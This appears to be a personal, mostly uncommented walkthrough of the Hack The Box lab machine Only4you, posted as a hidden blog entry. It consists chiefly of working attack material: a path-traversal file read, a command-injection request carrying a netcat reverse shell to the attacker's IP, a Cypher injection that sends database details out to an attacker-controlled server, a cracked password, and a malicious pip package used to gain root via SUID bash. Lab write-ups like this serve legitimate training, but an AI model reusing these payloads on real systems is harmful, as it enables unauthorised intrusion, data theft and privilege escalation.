---
layout: post
title: htb only4you
date: 2023-04-26 21:48 +0200
hidden: true
---



## Gobuster

```bash
┌──(rether㉿rether)-[~]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u only4you.htb  -t 20 --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://only4you.htb
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/26 21:42:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.only4you.htb Status: 200 [Size: 2191]
Progress: 4590 / 4990 (91.98%)
===============================================================
2023/04/26 21:42:46 Finished
===============================================================
```



# Paylord for 

curl --location 'http://beta.only4you.htb/download' --form 'image="/var/www/only4you.htb/form.py"' 

```url
POST / HTTP/1.1
Host: only4you.htb
Content-Length: 85
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://only4you.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://only4you.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiWW91IGFyZSBub3QgYXV0aG9yaXplZCEiXX1dfQ.ZEmBMg.tZQzLcF96v78jhsU_0PvE0dsPWE
Connection: close

name=random+name&email=random%40gmail.com%7Crm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.11%208888%20%3E%2Ftmp%2Ff&subject=random+title&message=random+message
```



```
POST /search HTTP/1.1
Host: 127.0.0.1:8001
Content-Length: 258
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8001/search
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=2b66361a-3505-40f0-a1ab-d1d5fcfe6759
Connection: close

search='+OR+1%3d1+WITH+1+as+a+CALL+dbms.components()+YIELD+name,+versions,+edition+UNWIND+versions+as+version+LOAD+CSV+FROM+'http%3a//10.10.14.11%3a80/%3fversion%3d'+%2b+version+%2b+'%26name%3d'+%2b+name+%2b+'%26edition%3d'+%2b+edition+as+l+RETURN+0+as+_0+//
```

```
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
```

```bash
┌──(rether㉿rether)-[~/Documents/HTB/machines/onlyforyou]
└─$ ssh john@only4you.htb 
john@only4you.htb's password: 
Permission denied, please try again.
john@only4you.htb's password: 
[...]
john@only4you:~$ cat user.txt 
[user-flag]
john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/4you/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/4you/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/4you/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
     - 2.8 kB 9.4 MB/s
  Saved ./this_is_fine_wuzzi-0.0.1.tar.gz
Successfully downloaded this-is-fine-wuzzi
john@only4you:~$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
john@only4you:~$ /bin/bash -p
bash-5.0# cat /root/root.txt 
f642bdce9e30d4e472c084762208410e
```